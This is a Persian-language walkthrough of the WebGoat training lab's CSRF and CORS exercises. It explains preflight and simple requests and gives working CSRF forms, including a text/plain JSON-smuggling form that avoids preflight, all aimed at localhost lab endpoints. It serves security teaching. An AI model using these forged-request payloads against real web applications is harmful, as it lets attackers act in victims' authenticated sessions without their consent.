# حل تمرین‌های CSRF و CORS در WebGoat

## 1. بررسی صفحه اصلی قبل از اکسپلویت


ابتدا باید صفحهٔ قانونی‌ای که قرار است توسط مهاجم (شما) مورد سوءاستفاده قرار گیرد را بررسی کنیم
<img width="782" height="437" alt="Screenshot 2025-11-26 232242" src="https://github.com/user-attachments/assets/057d0a53-894b-4da2-bfe6-a7dab056f806" />


هدف این تمرین دریافت «پرچم» (flag) و همچنین ارسال درخواست از یک مبدأ متفاوت است.  
پس ابتدا روی دکمه‌ی **Submit Query** کلیک کرده و صفحه‌ای که در تب جدید باز می‌شود را بررسی می‌کنیم.
<img width="795" height="452" alt="Screenshot 2025-11-26 232254" src="https://github.com/user-attachments/assets/3b4d549f-5ba3-41e2-9431-33e718c8492e" />

در این صفحه می‌بینیم که مقدار success برابر **false** است؛ یعنی هنوز تمرین حل نشده است.
<img width="536" height="114" alt="Screenshot 2025-11-26 232248" src="https://github.com/user-attachments/assets/5449c98c-d507-4e9c-a4a1-1650ac8e10a5" />

حالا با **Inspect Element** و رفتن به تب **Network** و سپس **Reload**، درخواست POST را پیدا می‌کنیم.  
در آن، بخش‌های **Headers** و **Params** اهمیت دارند.

### 1. اطلاعات مورد نیاز
در اینجا به **Request URL** و **Request Method** نیاز داریم.

اکنون در سیستم خودتان، یک فایل جدید بسازید و کد زیر را داخل آن قرار دهید و آن را با نام `csrf.html` ذخیره کنید:

```html
<html>
<body>
 <form action="http://localhost:8000/WebGoat/csrf/basic-get-flag" method="POST">
  <input name="csrf" value="false" type="hidden">
  <input name="submit" type="hidden" value="submit-Query">
  <input type="submit" value="Submit">
 </form>
</body>
</html>
```
در این فرم:

مقدار action دقیقاً برابر Request URL است.

method همان متد POST داخل هدرهاست.

نام و مقدار فیلدهای <input> از بخش Params برداشته شده‌اند.

اکنون csrf.html را در مرورگر باز کنید.
در صفحهٔ نتیجه، پیام موفقیت دریافت می‌کنید و درخواست از سیستم خود شما ارسال شده است.
<img width="863" height="170" alt="Screenshot 2025-11-26 232300" src="https://github.com/user-attachments/assets/3ac170b3-f4f6-42fd-980c-daae4211fbad" />

در نهایت مقدار flag را کپی کرده و در صفحهٔ اولیه وارد کنید.
<img width="938" height="419" alt="Screenshot 2025-11-26 232307" src="https://github.com/user-attachments/assets/d58c762d-fcae-42c3-a1a6-223e6a396141" />

حل شد!
##2. ارسال بررسی (Review) از هاست دیگر
این صفحه شبیه بخشی از سیستم کامنت و امتیازدهی است.
وظیفه ما ارسال Review از مبدأ خارجی (روی سیستم خودمان) است.
<img width="759" height="491" alt="Screenshot 2025-11-26 232534" src="https://github.com/user-attachments/assets/cfc4ed53-536c-441f-ab2b-6a45c3b829e9" />

ابتدا یک بررسی وارد کرده و صفحه را همانند قبل Inspect کنید. سپس مطابق Params و Headers، فایل csrf.html زیر را بسازید:
```html
<html>
<body>
 <form action="http://localhost:8000/WebGoat/csrf/review" method="POST">
  <input name="reviewText" value="Awesome!" type="hidden">
  <input name="stars" type="hidden" value="4">
  <input name="validateReq" type="hidden" value="2aa14227b9a13d0bede0388a7fba9aa9">
  <input type="submit" value="Submit">
 </form>
</body>
</html>
```


نکته:
یک پارامتر اضافی با نام validateReq وجود دارد که مقدار آن ثابت است.
<img width="669" height="155" alt="Screenshot 2025-11-26 232538" src="https://github.com/user-attachments/assets/9a8ed04b-5f7c-455c-979e-88ef2e6d835b" />

فایل را ذخیره کرده و در مرورگر باز کنید.
<img width="409" height="88" alt="Screenshot 2025-11-26 232544" src="https://github.com/user-attachments/assets/fc530c98-6d70-4092-86cb-a01127a56c82" />
<img width="871" height="121" alt="Screenshot 2025-11-26 232549" src="https://github.com/user-attachments/assets/7b2ee906-2156-4f00-8717-5a30676642d5" />

تمرین با موفقیت تکمیل شد!
با باز کردن صفحهٔ اصلی پست، Review شما قابل مشاهده خواهد بود

###3. Cross-Origin Resource Sharing (CORS)

CORS یک مکانیزم امنیتی است که به مرورگر می‌گوید چه زمانی می‌تواند به یک منبع از دامنه‌ای دیگر دسترسی پیدا کند.

اگر یک درخواست از دامنه‌ای غیر از دامنهٔ اصلی ارسال شود، سرور باید هدر زیر را در پاسخ قرار دهد:

Access-Control-Allow-Origin

مقدمه‌ای دربارهٔ Preflight

قبل از ارسال برخی درخواست‌ها، مرورگر ابتدا یک درخواست OPTIONS ارسال می‌کند تا از سرور بپرسد آیا درخواست اصلی ایمن است یا خیر.

فقط «simple requests» بدون preflight ارسال می‌شوند.

Simple Requests شامل این Content-Type ها هستند:

application/x-www-form-urlencoded

multipart/form-data

text/plain

سایر انواع مانند application/json یا application/xml باعث Preflight می‌شوند.
در این بخش باید یک حمله CSRF با استفاده از JavaScript ایجاد کنیم.
اما چون Content-Type برابر JSON است، درخواست ساده نیست و مرورگر ابتدا Preflight ارسال می‌کند.

کد اولیهٔ پیشنهادی:
```html
<html>
 <body>
  <script >
   fetch("http://localhost:8000/WebGoat/csrf/feedback/message", {
    method: 'POST',
    headers: {
     'Content-Type': 'text/plain'
    },
    body: "{'name': 'WebGoat', 'email': 'webgoat@webgoat.org', 'content': 'WebGoat is the best!!'}"
   });
  </script>
</html>
</html>
```


با اجرای آن، مرورگر خطای زیر را نشان می‌دهد:

Cross-Origin Request Blocked
<img width="858" height="181" alt="Screenshot 2025-11-26 232729" src="https://github.com/user-attachments/assets/c1448415-38b0-40e3-a641-7b61fe792bb5" />

در Network نیز می‌بینید که هدر Access-Control-Allow-Origin وجود ندارد.

##راه‌حل تمرین

برای جلوگیری از preflight، باید درخواست را با یک حالت Simple Request ارسال کنیم.
بنابراین از form و content-type ساده استفاده می‌کنیم:
```html
<html>
  <body>
  <form action=http://localhost:8000/WebGoat/csrf/feedback/message  method=post enctype="text/plain" >
   <input name= ' {"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "WebGoat is the best!!", "ignore_me":" ' value='test"}' type='hidden'>
   <input type='submit' value='Submit'>
   
  </form>
  </body>
</html>
```


در اینجا دادهٔ JSON را به‌صورت متن قالب‌بندی کرده‌ایم و یک پارامتر ساختگی ignore_me اضافه کرده‌ایم تا مرورگر تصور کند همه چیز یک ورودی ساده است.
<img width="852" height="25" alt="Screenshot 2025-11-26 232737" src="https://github.com/user-attachments/assets/28429b9a-f342-4c01-ac63-6c227615a3b5" />

با اجرای فایل:
<img width="860" height="61" alt="Screenshot 2025-11-26 232741" src="https://github.com/user-attachments/assets/bf3ea50f-2e50-4479-b266-bfd2f81595d5" />
<img width="768" height="160" alt="Screenshot 2025-11-26 232748" src="https://github.com/user-attachments/assets/731211b7-37c7-4280-bc31-17808cce32e0" />

Success!!! 🎉
در پایان، flag را کپی کرده و در WebGoat وارد کنید.
